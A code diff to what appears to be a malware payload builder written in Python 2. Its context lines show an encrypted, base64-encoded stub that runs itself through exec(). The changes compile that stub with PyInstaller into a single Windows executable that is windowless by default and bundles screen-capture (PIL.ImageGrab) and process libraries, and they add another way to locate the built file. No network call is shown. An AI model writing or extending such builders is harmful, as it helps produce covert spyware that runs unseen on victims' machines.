@@ -5,6 +5,7 @@ import os
 import tempfile
 import shutil
 import time
+import subprocess
 
 from Crypto.Cipher import AES
 from core.color import color
@@ -168,11 +169,26 @@ exec(outputdecryptedfrombase64.decode("utf-8"))
                         if not ".exe" in outputfile:
                             outputfile += ".exe"
 
-                        os.system("c:\Python27\Scripts\pyinstaller.exe --onefile --noconsole --windowed %s" % stubname)
+                        console_debug = ''
+                        hidden_imports = '--hidden-import PIL.ImageGrab '
+                        hidden_imports += '--hidden-import psutil '
+
+                        if sanitized[3] == "False":
+                            console_debug = "--noconsole --windowed"
+                        else:
+                            console_debug = None
+
+                        if console_debug is None:
+                            query = "c:\Python27\Scripts\pyinstaller.exe %s --onefile %s" % (hidden_imports, stubname)
+                        else:
+                            query = "c:\Python27\Scripts\pyinstaller.exe %s --onefile %s %s" % (
+                                hidden_imports, console_debug, stubname)
+                        print query
+                        subprocess.call(query)
                         time.sleep(5)
                         if os.path.exists(
                                 "C:\Python27\Scripts\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(
-                                        stubname)):
+                                    stubname)):
                             shutil.copyfile(
                                 "C:\Python27\Scripts\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(
                                     stubname),
@@ -182,8 +198,18 @@ exec(outputdecryptedfrombase64.decode("utf-8"))
                             shutil.copyfile(
                                 "C:\Python27\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(stubname),
                                 outputfile)
+                        elif os.path.exists(
+                                "C:\Python27\build\%s\%s.exe" % (PayloadGenerator.getFileNameWithoutExtension(stubname),
+                                                                 PayloadGenerator.getFileNameWithoutExtension(
+                                                                     stubname))):
+                            shutil.copyfile(
+                                "C:\Python27\build\%s\%s.exe" % (PayloadGenerator.getFileNameWithoutExtension(stubname),
+                                                                 PayloadGenerator.getFileNameWithoutExtension(
+                                                                     stubname)),
+                                outputfile)
                         else:
-                            print color.ReturnError("Can't move file to location, maybe pyinstaller didn't move it yet.")
+                            print color.ReturnError(
+                                "Can't move file to location, maybe pyinstaller didn't move it yet.")
 
                         try:
                             os.remove(stubname)
